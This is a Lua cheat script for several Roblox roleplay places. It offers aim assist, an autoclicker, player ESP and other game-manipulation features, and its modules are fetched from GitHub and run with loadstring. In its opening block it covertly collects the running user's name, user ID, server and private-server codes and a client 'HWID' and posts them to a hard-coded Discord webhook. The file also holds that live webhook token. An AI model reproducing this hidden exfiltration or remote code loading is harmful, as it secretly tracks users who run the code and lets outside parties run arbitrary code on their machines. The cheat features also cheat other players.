local cloneref = cloneref or function(v) return v end

pcall(function()
    local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or
        request
    local HttpService = cloneref(game:GetService("HttpService"))
    local Players = cloneref(game:GetService("Players"))
    local TS = cloneref(game:GetService("TeleportService"))

    local privateServerCode = nil
    pcall(function()
        if TS and typeof(TS.GetLocalPlayerTeleportData) == "function" then
            local td = TS:GetLocalPlayerTeleportData()
            if type(td) == "table" and td.serverCode then
                privateServerCode = tostring(td.serverCode)
            end
        end
    end)

    if not privateServerCode and game.PrivateServerId and game.PrivateServerId ~= "" then
        privateServerCode = tostring(game.PrivateServerId)
    end

    if not privateServerCode then
        pcall(function()
            local RS = cloneref(game:GetService("ReplicatedStorage"))
            local rem = RS:FindFirstChild("Remotes")
            if rem then
                local gs = rem:FindFirstChild("GameServices")
                local ts = gs and gs:FindFirstChild("ToServer")
                local rf = ts and ts:FindFirstChild("GetPrivateServerOwnerId")
                if rf and rf:IsA("RemoteFunction") then
                    local id = rf:InvokeServer()
                    if type(id) == "number" and id > 0 then
                        privateServerCode = "Owner ID: " .. tostring(id)
                    end
                end
            end
        end)
    end

    local serverInfo = "\n**Server Id**: " .. tostring(game.JobId)
    if privateServerCode then
        serverInfo = serverInfo .. "\n**Private Server Code**: " .. privateServerCode
    end

    local hwid = "Unknown"
    pcall(function()
        local rbxAnalytics = game:GetService("RbxAnalyticsService")
        if rbxAnalytics and typeof(rbxAnalytics.GetClientId) == "function" then
            hwid = rbxAnalytics:GetClientId()
        end
    end)

    if type(httprequest) == "function" then
        local lp = Players.LocalPlayer
        local lpName = lp and lp.Name or "Unknown"
        local lpUserId = lp and tostring(lp.UserId) or "0"

        httprequest({
            Url =
            "https://discord.com/api/webhooks/1489706136637800468/XRiSABmsy0PVxbknhSpJG-h8Fvlyc3x_vONCI8OExFlDphyaFlroD43mbm6n35IfSBYO",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = {
                    {
                        title = tostring(lpName),
                        description =
                            "\n**User Link**: " .. "https://www.roblox.com/users/" .. lpUserId ..
                            "\n**Game Link:** " .. "https://www.roblox.com/games/" .. game.PlaceId ..
                            serverInfo ..
                            "\n**HWID**: " .. tostring(hwid) ..
                            "\n**Time**: " .. os.date("%Y-%m-%d %H:%M:%S", os.time()) ..
                            "\n**Executor**: " .. (typeof(identifyexecutor) == "function" and tostring(identifyexecutor()) or "Unknown"),
                        color = privateServerCode and 0x00FF88 or 0xFFFFFF,
                    }
                }
            })
        })
    end
end)

local Players = cloneref(game:GetService("Players"))

local SupportedVersions = {
    -- Moonlight Creek
    [10561483644] = 588,

    -- Supernatural Academy
    [10561484691] = 524,

    -- New Orleans
    [10561482233] = 198,
}

local expectedVersion = SupportedVersions[game.PlaceId]

if not expectedVersion then
    local lp = Players.LocalPlayer
    if lp then
        lp:Kick("Script is currently disabled: Unsupported Place")
    end
    return
end

if game.PlaceVersion ~= expectedVersion then
    local lp = Players.LocalPlayer
    if lp then
        lp:Kick("Script is currently disabled: Game Update Detected")
    end
    return
end

local clonefunction = clonefunction or function(v) return v end

local RAW           = "https://raw.githubusercontent.com/delusorie/witch/refs/heads/main/"

local function fetch(path)
    local ok, result = pcall(function()
        local src = game:HttpGet(RAW .. path, true)
        if not src then return nil end
        local fn = loadstring(src)
        if type(fn) == "function" then
            return fn()
        end
        return nil
    end)
    if ok then return result end
    return nil
end

local UIS              = cloneref(game:GetService("UserInputService"))
local TweenService     = cloneref(game:GetService("TweenService"))

getgenv().diarianFlags = {
    autoMotus        = false,
    autoMotusFriends = true,
    aimAssister      = false,
    autoClicker      = false,
    outspammer       = false,
    espEnabled       = false,
    bloodbagESP      = false,
    plantESP         = false,
    questSoulCoins   = false,
    questTombBook    = false,
    questPaintCans   = false,
    questTrumpet     = false,
}

local F                = getgenv().diarianFlags

local libRaw           = game:HttpGet("https://raw.githubusercontent.com/delusorie/ui/refs/heads/main/source.lua")
local libFn            = loadstring(libRaw)
if type(libFn) ~= "function" then
    warn("Failed to load UI Library")
    return
end
local Library          = libFn()

local Window           = Library:Window({
    Name   = "diarian",
    Icon   = 104824991042380,
    Accent = Color3.fromRGB(80, 140, 255)
})

local Watermark        = Library:Watermark()
Library.MenuKeybind    = Enum.KeyCode.K

local function GetPlayerNames()
    local names = {}
    for _, p in Players:GetPlayers() do
        if p ~= Players.LocalPlayer then
            table.insert(names, p.Name)
        end
    end
    if #names == 0 then names = { "--- no players ---" } end
    return names
end

local _PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui", 10)

local KbGui = Instance.new("ScreenGui")
KbGui.Name = "diarian_kb"
KbGui.ResetOnSpawn = false
KbGui.IgnoreGuiInset = true
KbGui.DisplayOrder = 99
KbGui.Parent = _PlayerGui

local KbFrame = Instance.new("Frame", KbGui)
KbFrame.Name = "KeybindList"
KbFrame.AnchorPoint = Vector2.new(0, 0.5)
KbFrame.Position = UDim2.new(0, 10, 0.5, 0)
KbFrame.Size = UDim2.fromOffset(180, 32)
KbFrame.BackgroundColor3 = Color3.fromRGB(14, 17, 27)
KbFrame.BorderSizePixel = 0
KbFrame.Visible = true
KbFrame.Active = true
Instance.new("UICorner", KbFrame).CornerRadius = UDim.new(0, 6)

local KbStroke = Instance.new("UIStroke", KbFrame)
KbStroke.Color = Color3.fromRGB(50, 70, 130)
KbStroke.Thickness = 1
KbStroke.Transparency = 0.5

local KbList = Instance.new("UIListLayout", KbFrame)
KbList.FillDirection = Enum.FillDirection.Vertical
KbList.HorizontalAlignment = Enum.HorizontalAlignment.Left
KbList.SortOrder = Enum.SortOrder.LayoutOrder
KbList.Padding = UDim.new(0, 0)

local KbTitle = Instance.new("TextLabel", KbFrame)
KbTitle.Name = "_title"
KbTitle.LayoutOrder = 0
KbTitle.Size = UDim2.fromOffset(180, 26)
KbTitle.BackgroundTransparency = 1
KbTitle.Text = "Keybinds"
KbTitle.TextColor3 = Color3.fromRGB(160, 175, 210)
KbTitle.TextSize = 11
KbTitle.Font = Enum.Font.GothamBold
KbTitle.TextXAlignment = Enum.TextXAlignment.Center

local KbTitleLine = Instance.new("Frame", KbFrame)
KbTitleLine.LayoutOrder = 1
KbTitleLine.Size = UDim2.fromOffset(180, 1)
KbTitleLine.BackgroundColor3 = Color3.fromRGB(35, 45, 75)
KbTitleLine.BorderSizePixel = 0

do
    local dragging = false
    local dragStart, startPos
    KbFrame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = KbFrame.Position
        end
    end)
    KbFrame.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - dragStart
            KbFrame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
end

local KbEntries    = {
    { flag = "out_normal_enabled",  label = "AutoClicker", key = "R", order = 10 },
    { flag = "out_special_enabled", label = "Outspammer",  key = "R", order = 11 },
}

local KbRows       = {}
local COLOR_NORMAL = Color3.fromRGB(80, 128, 220)
local COLOR_GLOW   = Color3.fromRGB(140, 200, 255)
local BG_NORMAL    = Color3.fromRGB(14, 17, 27)
local BG_GLOW      = Color3.fromRGB(30, 50, 90)
local TWEEN_IN     = TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local TWEEN_OUT    = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local function MakeKbRow(entry)
    local row = Instance.new("Frame", KbFrame)
    row.Name = entry.flag
    row.LayoutOrder = entry.order
    row.Size = UDim2.fromOffset(180, 22)
    row.BackgroundColor3 = BG_NORMAL
    row.BackgroundTransparency = 1
    row.Visible = false
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.fromOffset(110, 22)
    lbl.Position = UDim2.fromOffset(10, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = entry.label
    lbl.TextColor3 = Color3.fromRGB(110, 128, 165)
    lbl.TextSize = 12
    lbl.Font = Enum.Font.GothamMedium
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    local badge = Instance.new("TextLabel", row)
    badge.Size = UDim2.fromOffset(60, 22)
    badge.Position = UDim2.fromOffset(118, 0)
    badge.BackgroundTransparency = 1
    badge.Text = "[" .. entry.key .. "]"
    badge.TextColor3 = COLOR_NORMAL
    badge.TextSize = 11
    badge.Font = Enum.Font.GothamBold
    badge.TextXAlignment = Enum.TextXAlignment.Right

    local stroke = Instance.new("UIStroke", row)
    stroke.Color = Color3.fromRGB(100, 160, 255)
    stroke.Thickness = 1
    stroke.Transparency = 1

    local data = {
        frame        = row,
        badge        = badge,
        stroke       = stroke,
        glowing      = false,
        toggleActive = false,
        keyHeld      = false,
    }

    function data:SetGlow(on)
        if self.glowing == on then return end
        self.glowing = on
        local info = on and TWEEN_IN or TWEEN_OUT
        TweenService:Create(self.frame, info, {
            BackgroundTransparency = on and 0.6 or 1,
            BackgroundColor3       = on and BG_GLOW or BG_NORMAL
        }):Play()
        TweenService:Create(self.badge, info, { TextColor3 = on and COLOR_GLOW or COLOR_NORMAL }):Play()
        TweenService:Create(self.stroke, info, { Transparency = on and 0.2 or 1 }):Play()
    end

    function data:UpdateGlow()
        self:SetGlow(self.toggleActive or self.keyHeld)
    end

    return data
end

for _, entry in ipairs(KbEntries) do
    KbRows[entry.flag] = MakeKbRow(entry)
end

local function RefreshKbFrame()
    local count = 0
    for _, data in pairs(KbRows) do
        if data.frame.Visible then count += 1 end
    end
    if count == 0 then
        KbFrame.Visible = false
    else
        KbFrame.Visible = true
        KbFrame.Size = UDim2.fromOffset(180, 27 + count * 22)
    end
end

local function SetKeybindActive(flag, active)
    local data = KbRows[flag]
    if not data then return end
    data.frame.Visible = active
    if not active then
        data.toggleActive = false
        data.keyHeld = false
    end
    data:UpdateGlow()
    RefreshKbFrame()
end

local function SetKeybindHeld(flag, held)
    local data = KbRows[flag]
    if not data then return end
    data.keyHeld = held
    data:UpdateGlow()
end

local function SetKeybindToggled(flag, active)
    local data = KbRows[flag]
    if not data then return end
    data.toggleActive = active
    data:UpdateGlow()
end

local _modulesLoaded = {}
local function loadOnce(key, path)
    if _modulesLoaded[key] then return _modulesLoaded[key] end
    local result = fetch(path)
    _modulesLoaded[key] = result or true
    return _modulesLoaded[key]
end

local AimCfg, ESPConfig, AntiAnnoy, AutoCompell, FPSBooster, Ambience, Effects

task.spawn(function()
    fetch("combat/AimAssist")
    AimCfg                        = getgenv().AimAssisterConfig
    AntiAnnoy                     = fetch("ultilities/AntiAnnoy")
    AutoCompell                   = fetch("ultilities/AutoCompell")
    FPSBooster                    = fetch("ultilities/FpsBooster")
    Ambience                      = fetch("esp/world/Ambience")
    Effects                       = fetch("esp/world/Effects")
    _modulesLoaded["aimAssister"] = true
    _modulesLoaded["antiAnnoy"]   = AntiAnnoy or true
    _modulesLoaded["autoCompell"] = AutoCompell or true
    _modulesLoaded["fpsBooster"]  = FPSBooster or true
    _modulesLoaded["ambience"]    = Ambience or true
    _modulesLoaded["effects"]     = Effects or true
end)

local function getAimCfg() return AimCfg or getgenv().AimAssisterConfig end
local function getAntiAnnoy() return AntiAnnoy or _modulesLoaded["antiAnnoy"] end
local function getFPS() return FPSBooster or _modulesLoaded["fpsBooster"] end
local function getCompell() return AutoCompell or _modulesLoaded["autoCompell"] end
local function getAmbience() return Ambience or _modulesLoaded["ambience"] end
local function getEffects() return Effects or _modulesLoaded["effects"] end

local autoclickerSettings = nil
local function getAutoclicker()
    if not autoclickerSettings then
        autoclickerSettings = loadOnce("autoclicker", "combat/Autoclicker.lua")
    end
    return autoclickerSettings
end

local outspammerSettings = nil
local function getOutspammer()
    if not outspammerSettings then
        outspammerSettings = loadOnce("specialSpam", "combat/outspammer") or getgenv().diarianSpecialSpam
    end
    return outspammerSettings or getgenv().diarianSpecialSpam
end

local function getESPConfig()
    if not ESPConfig then
        ESPConfig = _modulesLoaded["playersESP"] or getgenv().diarianESPConfig
    end
    return ESPConfig or getgenv().diarianESPConfig
end

local Combat       = Window:Tab({ Name = "Combat", Icon = "hand" })
local CombatSub    = Combat:SubTab({ Name = "Combat", Icon = "sword" })
local UtilitiesSub = Combat:SubTab({ Name = "Utilities", Icon = "package" })

local CombatMain   = CombatSub:Section({ Name = "Combat", Side = 1 })

CombatMain:Toggle({
    Name     = "Auto Motus",
    Default  = false,
    Flag     = "combat_ictus",
    Callback = function(v)
        F.autoMotus = v
        if v then loadOnce("autoMotus", "combat/AutoMotus") end
    end
})

CombatMain:Toggle({
    Name     = "Ignore Friends",
    Default  = true,
    Flag     = "combat_motus_friends",
    Callback = function(v)
        F.autoMotusFriends = v
    end
})

local NormalSection = CombatSub:Section({ Name = "AutoClicker", Side = 1 })
local NormalKeybind

local NormalToggle = NormalSection:Toggle({
    Name     = "AutoClicker",
    Default  = false,
    Flag     = "out_normal_enabled",
    Callback = function(v)
        F.autoClicker = v
        SetKeybindActive("out_normal_enabled", v)
        local s = getAutoclicker()
        if s and type(s) == "table" then
            if not v then
                s.NormalEnabled = false
            end
        end
    end
})

NormalSection:Dropdown({
    Name    = "Exclude Targets",
    Items   = GetPlayerNames(),
    Default = nil,
    Multi   = true,
    Flag    = "out_normal_exclude"
})

NormalSection:Toggle({
    Name     = "Ignore Friends",
    Default  = true,
    Flag     = "out_normal_friends",
    Callback = function(v)
        local s = getAutoclicker()
        if s and type(s) == "table" then s.IgnoreFriends = v end
    end
})

NormalKeybind = NormalToggle:Keybind({
    Name        = "Key AutoClicker",
    Default     = Enum.KeyCode.R,
    Flag        = "out_normal_key",
    Independent = true,
    Callback    = function(active)
        if not F.autoClicker then return end
        local s = getAutoclicker()
        if not s or type(s) ~= "table" then return end

        local newState
        if NormalKeybind and NormalKeybind.Mode == "Hold" then
            newState = active
            SetKeybindHeld("out_normal_enabled", newState)
        else
            newState = not s.NormalEnabled
            SetKeybindToggled("out_normal_enabled", newState)
        end

        s.NormalEnabled = newState

        Library:Notification({
            Name        = "AutoClicker",
            Description = newState and "ON" or "OFF",
            Icon        = newState and "check" or "x",
            Duration    = 2
        })
    end
})

local FriendSection = CombatSub:Section({ Name = "Friends", Side = 1 })

FriendSection:Button({
    Name     = "Refresh Friend Cache",
    Callback = function()
        Library:Notification({
            Name        = "Friend Cache",
            Description = "Refreshed friends list for all modules.",
            Icon        = "refresh-cw",
            Duration    = 2
        })

        local cache = getgenv().diarianFriendCache or {}
        getgenv().diarianFriendCache = cache
        table.clear(cache)

        local LP = Players.LocalPlayer
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP then
                task.spawn(function()
                    local ok, isFriend = pcall(function()
                        return LP:IsFriendsWith(p.UserId)
                    end)
                    if ok then cache[p.UserId] = isFriend end
                end)
            end
        end

        pcall(function()
            local pESP = getESPConfig()
            if pESP and type(pESP) == "table" and pESP.refreshFriends then
                pESP.refreshFriends()
            end
        end)

        pcall(function()
            local s = getAutoclicker()
            if s and type(s) == "table" and s.RefreshFriends then
                s.RefreshFriends()
            end
        end)

        pcall(function()
            local spam = getOutspammer()
            if spam and type(spam) == "table" and spam.RefreshFriends then
                spam.RefreshFriends()
            end
        end)

        pcall(function()
            if getgenv().diarianRefreshMotusFriends then
                getgenv().diarianRefreshMotusFriends()
            end
        end)
    end
})

local AimSection = CombatSub:Section({ Name = "Aim Assister", Side = 2 })

AimSection:Toggle({
    Name     = "Aim Assister",
    Default  = false,
    Flag     = "combat_aim",
    Callback = function(v)
        F.aimAssister = v
        local cfg = getAimCfg()
        if cfg then cfg.enabled = v end
    end
})

AimSection:Toggle({
    Name     = "Ignore Friends",
    Default  = true,
    Flag     = "combat_aim_friends",
    Callback = function(v)
        local cfg = getAimCfg()
        if cfg then cfg.ignoreFriends = v end
    end
})

AimSection:Toggle({
    Name     = "Exclude Invisible",
    Default  = true,
    Flag     = "combat_aim_invisible",
    Callback = function(v)
        local cfg = getAimCfg()
        if cfg then cfg.excludeInvisible = v end
    end
})

AimSection:Toggle({
    Name     = "Respect Collisions Barrier",
    Default  = true,
    Flag     = "combat_aim_collisions",
    Callback = function(v)
        local cfg = getAimCfg()
        if cfg then cfg.respectCollisions = v end
    end
})

local SpecialSection = CombatSub:Section({ Name = "Outspammer", Side = 2 })
local SpecialKeybind

local SpecialToggle = SpecialSection:Toggle({
    Name     = "Outspammer",
    Default  = false,
    Flag     = "out_special_enabled",
    Callback = function(v)
        F.outspammer = v
        SetKeybindActive("out_special_enabled", v)
        local s = getOutspammer()
        if s and type(s) == "table" then
            if not v then
                s.Enabled = false
            end
        end
    end
})

SpecialSection:Dropdown({
    Name    = "Exclude Targets",
    Items   = GetPlayerNames(),
    Default = nil,
    Multi   = true,
    Flag    = "out_special_exclude"
})

SpecialSection:Toggle({
    Name     = "Ignore Friends",
    Default  = true,
    Flag     = "out_special_friends",
    Callback = function(v)
        local s = getOutspammer()
        if s and type(s) == "table" then s.IgnoreFriends = v end
    end
})

SpecialKeybind = SpecialToggle:Keybind({
    Name        = "Key Outspammer",
    Default     = Enum.KeyCode.R,
    Flag        = "out_special_key",
    Independent = true,
    Callback    = function(active)
        if not F.outspammer then return end
        local s = getOutspammer()
        if not s or type(s) ~= "table" then return end

        local newState
        if SpecialKeybind and SpecialKeybind.Mode == "Hold" then
            newState = active
            SetKeybindHeld("out_special_enabled", newState)
        else
            newState = not s.Enabled
            SetKeybindToggled("out_special_enabled", newState)
        end

        s.Enabled = newState

        Library:Notification({
            Name        = "Outspammer",
            Description = newState and "ON" or "OFF",
            Icon        = newState and "check" or "x",
            Duration    = 2
        })
    end
})

local Essentials = UtilitiesSub:Section({ Name = "Essentials", Side = 1 })

Essentials:Button({
    Name     = "Unlock Custom Wheel",
    Callback = function()
        loadOnce("unlockWheel", "ultilities/CustomWheel")
        Library:Notification({ Name = "Custom Wheel", Description = "Unlocked.", Icon = "unlock", Duration = 3 })
    end
})

Essentials:Button({
    Name     = "Rejoin Server",
    Callback = function()
        Library:Notification({ Name = "Rejoining...", Description = "Connecting to new server.", Icon = "refresh-cw", Duration = 3 })
        loadOnce("rejoin", "ultilities/Rejoin")
    end
})

Essentials:Toggle({
    Name     = "Anti Annoy",
    Default  = false,
    Flag     = "util_anti_annoy",
    Callback = function(v)
        local m = getAntiAnnoy()
        if m then m.SetEnabled(v) end
    end
})

Essentials:Toggle({
    Name     = "FPS Booster",
    Default  = false,
    Flag     = "util_fps_booster",
    Callback = function(v)
        local m = getFPS()
        if m then m.SetEnabled(v) end
    end
})

Essentials:Dropdown({
    Name     = "FPS Level",
    Items    = { "Balanced", "Performance", "Extreme" },
    Default  = "Balanced",
    Flag     = "util_fps_level",
    Callback = function(v)
        local m = getFPS()
        if m then m.SetLevel(v) end
    end
})

local VoiceSection = UtilitiesSub:Section({ Name = "VoiceLines", Side = 1 })
VoiceSection:Toggle({ Name = "VoiceLines", Default = false, Flag = "util_voice_enabled" })
VoiceSection:Slider({ Name = "Volume", Min = 0, Max = 100, Default = 50, Suffix = "%", Flag = "util_voice_volume" })

local CompSection = UtilitiesSub:Section({ Name = "Compulsion", Side = 2 })

CompSection:Toggle({
    Name     = "Compulsion",
    Default  = false,
    Flag     = "util_comp_enabled",
    Callback = function(v)
        local m = getCompell()
        if m then m.SetEnabled(v) end
    end
})

CompSection:Dropdown({
    Name     = "Select Compulsion",
    Items    = { "WalkAway", "Sleep", "FollowMe", "MakeInvisible", "TakeStake" },
    Default  = "Sleep",
    Multi    = false,
    Flag     = "util_comp_select",
    Callback = function(v)
        local m = getCompell()
        if m then m.SetAction(v) end
    end
})

local Visuals = Window:Tab({ Name = "Visuals", Icon = "eye" })
local Esp     = Visuals:SubTab({ Name = "ESP", Icon = "scan-eye" })
local World   = Visuals:SubTab({ Name = "World", Icon = "globe" })

local EspMain = Esp:Section({ Name = "Players", Side = 1 })

EspMain:Toggle({
    Name     = "ESP",
    Default  = false,
    Flag     = "esp_enabled",
    Callback = function(v)
        F.espEnabled = v
        if v and not _modulesLoaded["playersESP"] then
            ESPConfig = loadOnce("playersESP", "esp/Player")
            if type(ESPConfig) ~= "table" then
                ESPConfig = getgenv().diarianESPConfig
            end
            if ESPConfig then
                if F.esp_names ~= nil then ESPConfig.showNames = F.esp_names end
                if F.esp_species ~= nil then ESPConfig.showSpecies = F.esp_species end
                if F.esp_charname ~= nil then ESPConfig.showCharName = F.esp_charname end
                if F.esp_toolitem ~= nil then ESPConfig.showToolItem = F.esp_toolitem end
                if F.esp_astral ~= nil then ESPConfig.showAstral = F.esp_astral end
                if F.esp_dead ~= nil then ESPConfig.showBodies = F.esp_dead end
                if F.esp_invisible ~= nil then ESPConfig.showInvisible = F.esp_invisible end
                if F.espDistance ~= nil then ESPConfig.maxDistance = F.espDistance end
                if F.esp_text_size ~= nil then ESPConfig.textSize = F.esp_text_size end
                if F.esp_friend_color ~= nil then ESPConfig.friendColor = F.esp_friend_color end
            end
        end
        local cfg = ESPConfig or getgenv().diarianESPConfig
        if cfg then cfg.enabled = v end
    end
})


EspMain:Toggle({
    Name     = "Names",
    Default  = true,
    Flag     = "esp_names",
    Callback = function(v)
        F.esp_names = v
        local cfg = getESPConfig()
        if cfg then cfg.showNames = v end
    end
})

EspMain:Toggle({
    Name     = "Species",
    Default  = false,
    Flag     = "esp_species",
    Callback = function(v)
        F.esp_species = v
        local cfg = getESPConfig()
        if cfg then cfg.showSpecies = v end
    end
})

EspMain:Toggle({
    Name     = "Character name",
    Default  = true,
    Flag     = "esp_charname",
    Callback = function(v)
        F.esp_charname = v
        local cfg = getESPConfig()
        if cfg then cfg.showCharName = v end
    end
})

EspMain:Toggle({
    Name     = "Tool item",
    Default  = true,
    Flag     = "esp_toolitem",
    Callback = function(v)
        F.esp_toolitem = v
        local cfg = getESPConfig()
        if cfg then cfg.showToolItem = v end
    end
})

EspMain:Colorpicker({
    Name     = "Friend color",
    Default  = Color3.fromRGB(96, 200, 128),
    Flag     = "esp_friend_color",
    Callback = function(v)
        F.esp_friend_color = v
        local cfg = getESPConfig()
        if cfg then cfg.friendColor = v end
    end
})

EspMain:Slider({
    Name     = "Text size",
    Min      = 8,
    Max      = 24,
    Default  = 14,
    Flag     = "esp_text_size",
    Callback = function(v)
        F.esp_text_size = v
        local cfg = getESPConfig()
        if cfg then cfg.textSize = v end
    end
})

EspMain:Label({ Name = "─────────────────────" })

EspMain:Toggle({
    Name     = "Show Astral Body",
    Default  = false,
    Flag     = "esp_astral",
    Callback = function(v)
        F.esp_astral = v
        local cfg = getESPConfig()
        if cfg then cfg.showAstral = v end
    end
})

EspMain:Toggle({
    Name     = "Dead Bodies",
    Default  = false,
    Flag     = "esp_dead",
    Callback = function(v)
        F.esp_dead = v
        local cfg = getESPConfig()
        if cfg then cfg.showBodies = v end
    end
})

EspMain:Toggle({
    Name     = "Invisible",
    Default  = true,
    Flag     = "esp_invisible",
    Callback = function(v)
        F.esp_invisible = v
        local cfg = getESPConfig()
        if cfg then cfg.showInvisible = v end
    end
})

local EspExtra = Esp:Section({ Name = "Extras", Side = 2 })

EspExtra:Toggle({
    Name     = "Plant ESP",
    Default  = false,
    Flag     = "esp_plant",
    Callback = function(v)
        F.plantESP = v
        if v then loadOnce("plantESP", "esp/Plant") end
    end
})

EspExtra:Toggle({
    Name     = "Bloodbag ESP",
    Default  = false,
    Flag     = "esp_bloodbag",
    Callback = function(v)
        F.bloodbagESP = v
        if v then loadOnce("bloodbagESP", "esp/Blood") end
    end
})

EspExtra:Slider({
    Name     = "Render distance",
    Min      = 100,
    Max      = 5000,
    Default  = 1500,
    Suffix   = "m",
    Flag     = "esp_distance",
    Callback = function(v)
        F.espDistance = v
        local cfg = getESPConfig()
        if cfg then cfg.maxDistance = v end
    end
})

local EspQuests = Esp:Section({ Name = "Quests", Side = 2 })

EspQuests:Toggle({
    Name     = "SoulCoins",
    Default  = false,
    Flag     = "quest_soulcoins",
    Callback = function(v)
        F.questSoulCoins = v
        if v then loadOnce("questsESP", "esp/Quest") end
    end
})

EspQuests:Toggle({
    Name     = "Tomb Book",
    Default  = false,
    Flag     = "quest_tombbook",
    Callback = function(v)
        F.questTombBook = v
        if v then loadOnce("questsESP", "esp/Quest") end
    end
})

EspQuests:Toggle({
    Name     = "Paint Cans",
    Default  = false,
    Flag     = "quest_paintcans",
    Callback = function(v)
        F.questPaintCans = v
        if v then loadOnce("questsESP", "esp/Quest") end
    end
})

EspQuests:Toggle({
    Name     = "Trumpet Thief",
    Default  = false,
    Flag     = "quest_trumpet",
    Callback = function(v)
        F.questTrumpet = v
        if v then loadOnce("questsESP", "esp/Quest") end
    end
})

local WorldMain = World:Section({ Name = "Ambience", Side = 1 })

WorldMain:Dropdown({
    Name     = "Weather",
    Items    = { "Clear", "Fog", "Cloudy", "Rain", "ThunderStorm", "Snow", "Blizzard", "Birds", "HellfireRain" },
    Default  = "Clear",
    Flag     = "world_weather",
    Callback = function(v)
        local m = getAmbience()
        if m then m.SetWeather(v) end
    end
})

WorldMain:Dropdown({
    Name     = "World State",
    Items    = {
        "DayTime", "NightTime", "DayBreak", "OtherSide", "AstralProjection",
        "TribridStorm", "SereneSky", "Twilight", "BlackAndWhite",
        "VibrantColours", "Hellfire", "Nebula", "ShowcaseOne", "ShowcaseTwo"
    },
    Default  = "DayTime",
    Flag     = "world_state",
    Callback = function(v)
        local m = getAmbience()
        if m then m.SetWorldState(v) end
    end
})

WorldMain:Toggle({
    Name     = "Lock Weather",
    Default  = false,
    Flag     = "world_lock_weather",
    Callback = function(v)
        local m = getAmbience()
        if m then m.SetWeatherLock(v) end
    end
})

WorldMain:Slider({
    Name     = "Time of Day",
    Min      = 0,
    Max      = 24,
    Default  = 12,
    Suffix   = "h",
    Flag     = "world_time",
    Callback = function(v)
        local m = getAmbience()
        if m then m.SetTime(v) end
    end
})

WorldMain:Toggle({
    Name     = "Lock Time",
    Default  = false,
    Flag     = "world_lock_time",
    Callback = function(v)
        local m = getAmbience()
        if m then m.SetTimeLock(v) end
    end
})

local WorldEffects = World:Section({ Name = "Effects", Side = 2 })

WorldEffects:Toggle({
    Name     = "No fog",
    Default  = false,
    Flag     = "world_nofog",
    Callback = function(v)
        local m = getEffects()
        if m then m.SetNoFog(v) end
    end
})

WorldEffects:Toggle({
    Name     = "No shadows",
    Default  = true,
    Flag     = "world_noshadows",
    Callback = function(v)
        local m = getEffects()
        if m then m.SetNoShadows(v) end
    end
})

local _fovInitialized = false
WorldEffects:Slider({
    Name     = "Field of view",
    Min      = 70,
    Max      = 120,
    Default  = 90,
    Suffix   = "°",
    Flag     = "world_fov",
    Callback = function(v)
        if not _fovInitialized then
            _fovInitialized = true
            return
        end
        local m = getEffects()
        if m then m.SetFieldOfView(v) end
    end
})

WorldEffects:Button({
    Name     = "Reset lighting",
    Callback = function()
        local m = getEffects()
        if m then
            m.SetNoFog(false)
            m.SetNoShadows(false)
            m.SetFieldOfView(90)
        end
        Library:Notification({ Name = "Lighting reset", Description = "All values restored.", Icon = "rotate-ccw", Duration = 3 })
    end
})

local Settings         = Window:Tab({ Name = "Settings", Icon = "settings" })
local ConfigSub        = Settings:SubTab({ Name = "Config", Icon = "save" })
local InterfaceSection = ConfigSub:Section({ Name = "Interface", Side = 1 })

InterfaceSection:Toggle({
    Name     = "Disable Watermark",
    Default  = false,
    Flag     = "cfg_disable_watermark",
    Callback = function(v)
        Watermark:SetVisible(not v)
    end
})

InterfaceSection:Toggle({
    Name     = "Keybind List",
    Default  = true,
    Flag     = "cfg_keybindlist",
    Callback = function(v)
        KbGui.Enabled = v
    end
})

InterfaceSection:Toggle({
    Name     = "Disable Notifications",
    Default  = false,
    Flag     = "cfg_no_notifs",
    Callback = function(v)
        Library.Silent = v
    end
})

local ConfigListSection = ConfigSub:Section({ Name = "Config List", Side = 2 })

local function GetConfigs()
    local list = Library:ListConfigs()
    if #list == 0 then return { "--- no configs ---" } end
    return list
end

local selectedConfig = ""
local configName     = ""

local ConfigDropdown
ConfigDropdown       = ConfigListSection:Dropdown({
    Name     = "Select Config",
    Items    = GetConfigs(),
    Default  = nil,
    Flag     = "cfg_selected",
    Callback = function(v)
        if v ~= "--- no configs ---" then selectedConfig = v end
    end
})

ConfigListSection:Textbox({
    Name        = "Config Name",
    Placeholder = "Config name...",
    Flag        = "cfg_name",
    Callback    = function(v) configName = v end
})

ConfigListSection:Button({
    Name     = "Save Config",
    Callback = function()
        local name = (configName ~= "" and configName) or (selectedConfig ~= "" and selectedConfig)
        if name and name ~= "" and name ~= "--- no configs ---" then
            Library:SaveConfigFile(name)
            Library:Notification({ Name = "Config", Description = "Saved: " .. name, Icon = "check", Duration = 2 })
            ConfigDropdown:Refresh(GetConfigs())
        else
            Library:Notification({ Name = "Config", Description = "Provide a valid name.", Icon = "alert-circle", Duration = 2 })
        end
    end
})

ConfigListSection:Button({
    Name     = "Load Config",
    Callback = function()
        local name = (selectedConfig ~= "" and selectedConfig) or (configName ~= "" and configName)
        if name and name ~= "" and name ~= "--- no configs ---" then
            local ok = Library:LoadConfigFile(name)
            if ok then
                Library:Notification({ Name = "Config", Description = "Loaded: " .. name, Icon = "check", Duration = 2 })
            else
                Library:Notification({ Name = "Config", Description = "Failed to load.", Icon = "alert-circle", Duration = 2 })
            end
        else
            Library:Notification({ Name = "Config", Description = "Select a config first.", Icon = "alert-circle", Duration = 2 })
        end
    end
})

ConfigListSection:Button({
    Name     = "Delete Config",
    Callback = function()
